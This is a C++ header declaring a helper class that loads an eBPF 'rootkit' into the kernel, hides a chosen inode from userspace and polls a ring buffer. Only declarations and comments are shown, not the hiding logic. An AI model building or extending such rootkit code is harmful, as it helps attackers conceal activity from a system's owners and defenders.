#ifndef ROOTKIT_EBPF_HELPER_H
#define ROOTKIT_EBPF_HELPER_H

#include <cstdint>
#include <string>
#include <optional>
#include "rootkit.skel.h"

namespace rootkit {

class RootkitBpfHelper {
private:
    struct rootkit_bpf * skel;
    struct ring_buffer * rb;
    uint64_t inode_to_hide;
    std::string error_msg;

public:
    /**
     * @brief Load rootkit bpf (src/ebpf/rootkit) into the kernel
     * @param  inode_to_hide Inode that will be hidden in userspace
     * @param rb_callback Callback function that will be called every time ring
     * buffer receives data
     */
    RootkitBpfHelper(const uint64_t inode_to_hide,
        int (* rb_callback)(void *, void *, unsigned long));

    /**
     * @brief Unload rootkit bpf
    */
    ~RootkitBpfHelper();

    /**
     * @brief Returns rootkit bpf status
     * @return Returns nullopt if bpf was loaded correctly, and error message otherwise
     */
    std::optional<std::string> status() const;

    /**
     * @return Returns loaded rootkit bpf, or nullptr if bpf wasn't properly loaded
     */
    struct rootkit_bpf * get_rootkit();

    /**
     * @brief Poll from ringbuffer
     * @param timeout Time in ms
     */
    void rb_poll(int timeout);

private:
    /**
     * @brief Destroy bpf
     */
    void clean();

    /**
     * @brief Setup links between bpf functions and their ID
     */
    void setup_arr_links();

    /*
     **
     * @brief Setups ring buffer so data is ready to poll from it
     * @param map Ring buffer map
     * @param callback Function that will be called after data is received
     */
    void setup_msg_ring_buffer(
        struct bpf_map * map,
        int (*callback)(void *, void *, unsigned long)
    );
};

}

#endif
